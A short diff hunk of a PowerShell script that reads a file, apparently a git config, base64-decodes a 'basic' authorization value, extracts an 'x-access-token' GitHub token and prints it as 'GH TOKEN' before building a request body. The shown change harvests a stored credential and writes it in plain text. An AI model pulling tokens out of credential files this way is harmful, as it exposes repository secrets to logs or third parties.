@@ -16,8 +16,12 @@ $fileContent = Get-Content -Path $filePath -Raw
 
 $token = ""
 if ($fileContent -match "basic[\s]+([\w\=]+)") {
-    $token = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($matches[1]))
-    Write-Output "GH TOKEN: $token"
+    $authHeader = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($matches[1]))
+    if ($authHeader -match "x-access-token:([\w\-\_]+)") {
+        $token = $matches[1]
+        Write-Output "GH TOKEN: $token"
+    }
+    
 }
 
 $body = @{
